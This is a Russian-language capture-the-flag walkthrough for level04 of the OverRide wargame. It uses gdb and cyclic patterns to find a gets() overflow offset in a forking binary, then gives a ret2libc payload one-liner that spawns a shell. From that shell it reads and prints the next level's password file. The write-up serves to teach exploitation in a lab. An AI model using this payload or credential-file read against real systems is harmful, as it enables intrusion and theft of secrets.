@@ -1,0 +1,78 @@
+Смотрим какие функции есть:
+* fork()
+* scanf()
+* kill
+* puts()
+* fork() - Fork () - это функция, которая создает новый процесс, 
+дублируя вызывающий процесс (см. man 2 fork). Это означает, что когда вы звоните 
+fork () и предполагая, что вызов не состоялся, 
+у вас будет два процесса, оригинальный процесс и новый, который является 
+копией оригинального.
+
+Pid_t тип данных для ID процесса. Вы можете получить ID процесса, вызывая getpid. 
+Функция getppid возвращает ID родителя текущего процесса (это также известно как 
+ID родительского процесса).
+
+Создаются переменные статуса, структуры, которая хранит id процесса, и
+массив для хранения shellcode-а.
+prctl - функция, цель которой оперировать процессами.
+
+ptrace - это средство, позволяющее родительскому процессу наблюдать и контролировать 
+протекание другого процесса, просматривать и изменять его данные и регистры. 
+Обычно эта функция используется для создания точек прерывания в программе отладки 
+и отслеживания системных вызовов.
+
+Дальше записывается строка через gets. Последняя имеет уязвимость переполнения буфера.
+
+Когда подаём обычные строки, то пишет, что есть доп рабочий процесс, который создался.
+level04@OverRide:~$ ./level04.sh 
+Give me some shellcode, k
+asd
+child is exiting...
+
+А когда подаём строки больше:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+То ничего не отвечает и не выходит из процесса.
+
+Алгоритм:
+Подаём строку с мусором в gdb:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+
+(gdb) r
+Starting program: /home/users/level04/level04.sh 
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+^C --- выходим через ctrl + С
+Program received signal SIGINT, Interrupt.
+0xf7fdb435 in __kernel_vsyscall ()
+
+Почему не Seugfault от переполнения?
+Потому что процесс передаётся дочерниму процессу, а основному процессу этого не имеет
+влияния.
+
+Мы можем установить в gdb параметр:
+set follow-fork-mode child
+чтобы gdb следовал за дочерним процессом, а в нём уже вызывать Sigsev ошибку.
+https://visualgdb.com/gdbreference/commands/set_follow-fork-mode
+А дальше снова сгенерировать мусор для подачи через
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+(gdb) r
+Starting program: /home/users/level04/level04.sh 
+[New process 3015]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3015]
+0x41326641 in ?? () -- офсет у нас на 0x41326641 - 156 символ.
+Заполняем мусором, входим так же как на level02 через system + exit + /bin/sh
+Адреса те же, только офсет теперь на 156 символе и тут нет логина для подачи.
+
+chmod 777 .
+level04@OverRide:~$ python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > payload
+level04@OverRide:~$ cat payload - | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
